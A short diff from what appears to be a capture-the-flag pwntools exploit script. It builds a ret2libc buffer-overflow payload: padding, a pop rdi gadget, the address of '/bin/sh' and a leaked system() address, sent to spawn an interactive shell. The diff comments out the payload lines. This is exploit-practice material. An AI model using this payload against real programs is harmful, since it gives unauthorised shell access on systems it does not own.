@@ -16,7 +16,8 @@ log.success(leak_sys_addr)
 # pop_rdi_addr=rop.find_gadget(['pop rdi','ret'])[0]
 # log.success(pop_rdi_addr)
 # sh_addr=libc_base+obj.dump('str_bin_sh')
-libc_sh=
-payload=flat([b'a'*(0x80+8),pop_rdi_addr,sh_addr,leak_sys_addr,0])
-p.sendline(payload)
+
+# libc_sh=
+# payload=flat([b'a'*(0x80+8),pop_rdi_addr,sh_addr,leak_sys_addr,0])
+# p.sendline(payload)
 p.interactive()
